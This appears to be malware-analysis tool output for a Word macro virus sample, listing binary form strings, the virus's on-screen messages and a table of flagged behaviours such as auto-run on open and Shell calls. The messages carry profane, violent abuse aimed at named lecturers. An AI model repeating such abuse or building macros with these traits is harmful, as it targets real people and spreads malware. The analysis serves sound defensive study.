VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)<.<B9JcZk��kk{�kk}�����}�����������ӻ�������ӻ�ƫͰ����Ǧ��������}��������}��}��~�����������������������}��ai~LY�GF�fs�19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JB9BJBBJBBJBJJBBOGGOGGOGGRJJOGGRJJOGGRJJOGGZKURBBZKUJBBOGGOGGJBBJBBJBBB9BB9BB9B99J!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)!)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B9999999999999)9F-=999B9BJBBJBBOGGOGGOGGOGGPRV���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)<.<199JBBJJR^RccZkiiqkk���������������ӻ�ӻ�������ӻ�ӻ̮��ƫ�ӻ́��~��������}��sx�fs����������iiqLHkBMk19c19c'1Y##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JJBBJBBJBBJBBOGGOGGOGGOGGOGGRJJOGGRJJOGGOGGNPTZKUJBBZKUJBJRBBJBBJBBJBBB9BB9B99J99J1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91)B9)91)B999999999999999F-=9)9B9BJBBJBBJBBOGGOGGPRV���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#))!)3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3#)B9JJBBJBBJBBOGGJ9RJJR�~�������������ӻ�������������ƫ�ƫ�ӻ���ތ��~��}��]i�sx����}��������]i�PZm9Fc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JB9BJBBJBBJBBJBBOGGOGGOGGOGGOGGRJJOGGOGGNPTRBJJJROGGRBBOGGJBBJBBJBBJBBB9B99J99J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B1)B9)91999)99999999999)99)9B9BB9BJBBOGGOGGOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)9)93#)=-1B9B999B9B3#)3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!')-9)99)9B9BJBBJBBJBBJBBJBB^Rc�~����������������������ӻ�������ƫ�ӻ̧��������{�iiqiiqa[~[ZlJJR1-X'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JB9BB9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGRJJOGGOGGRBJOGGZKUJBBJBBJBBJBBJBBJBB9)9<.<1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%91)B1)BB9B9)9999999999999999999999JBBJBBOGGOGGOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)=-1B9BJBBRBJRBJOGGJBBB9B3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3.+<.<B9BJBJJBBJBBJBBJBBJJRxcs������������������������ƫͮ��������{�k^g{u~kkwosNPTJJZBBR1-X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)BB9BB9BJBBJBBJBBJBBJJROGGOGGOGGOGGRJJOGGOGGOGGNPTZKUJBBOGGOGGJBBJBBJBBJBBB9B9)999J1)B'&D!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B3.D9)99999999999999999999)9F-=BB9JBBJBBOGGOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)B9BJBBZKU^RckVceYVZKUJBB=-13#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3#)B9BB9BJBBJBBJBBOGGJBBOGGOGGeYV�~�����~��������������~�wos{��~�k^gskckVcZKUsemJJRJJRB/V1)B'1Y!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JJBBJBBJBBJBBOGGOGGOGGOGGOGGZKUOGGOGGOGGOGGOGGOGGRBJOGGJBBJBBJBBB9BB9BB9B99J1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D1)B1)B<.<9999999999999)9999999999B9BJBBJBBOGGRBJPRV���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'=-1J99ZKUeYVk^gk^gsemsZcOGGJ999)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))!)3#)3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3.+B9BB9BJBBJBBJBBJBBOGGOGGOGGZKUZKUOGGZKUkVcum��~��mneYVRBJJBBk^gZKUJJROGGZKUZKURBJJ9R3=T1-X1-X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B9)9JBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGZKUZKUOGGOGGZKUOGGOGGOGGJBBJBBB9BB9BB9B9)91)B1)B'&D!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B99J<.<99J999999=-11991%1B9B9999)9B9BJBBOGGOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!=-1RBBZKUsZck^g�mnsemk^gZKUOGG<.<))!!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)3#)<.<=-19999993.+)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3#)<.<JBBJBBJBBJBBJBBJBBNPTNPTOGGOGGOGGNPTOGGRBJZKUJJROGGOGG^RcZKUZKUZKUOGGJJRJJRJJRBBRB/V#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B99JB9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGeYVZKURBBOGGRJJOGGOGGJBBJBBJBBJBB9)9J9B9)999J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D9)9<.<1)B9)9999999199=-1991199999B9BB9BJBBJBBOGGQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)3#)JBJZKUk^gskcsem�mnsemkVcRBBF-=3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3#)999J99JBBJBBJBBJBBF-=3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)991<.<B9BJBBJBBJBBJBBOGGOGGOGGOGGOGGJBBOGGOGGJBBOGGOGGOGGOGGZKUZKURBJJJRZKURBJJJRN?VJBJ19J1)B)%9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)BBBRB9JJBBJBBJBBJBBOGGJBBOGGNPTOGGRBJNPTZKUOGGOGGOGGOGGOGGJBBJBBB9BJBBJBB9)9<.<3.D1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B3.D99J9)9B9B9999993#)=-19)99999999)9JBBJBBJBBJBBQII���


-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!9)9JBBZKUsZck^g�mnskckVcZKUJBB<.<3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)J99JBBZKUOGGZKURBJJBB9)93#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3#)B9BB9BJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGOGGJBBJBBOGGOGGOGGOGGOGGNPTJJRZKUJJRZKURBJJ9RBBR1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B9)999JB9BJBBJBBJBBJBBJBBOGGJBBOGGOGGOGGOGGRJJOGGOGGRJJOGGJBBJBBJBBJBBB9B9)9J9B<.<1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D9)9<.<<.<999999999=-19)93.+999999F-=B9BJBBJBBJBBLDD
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ALL THE KDU STUDENT MUST BE ATTENTION!  WE ARE NOWC3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PREPARE TO FIGHT WITH KDU'S COMPUTER!  AND ALSO �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DAMN TWO FUCKING WOMEM(WENDY TEO, MADAM WONG!{J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�LAST CHEAP AND STUPID LECTURER( FRANKIE CHIENG)!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FUCK HIM ASSHOLE WITH PISTOL GUN!!!Qu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ACCEPT ACTION5K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DON'T ACCEPT?5K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

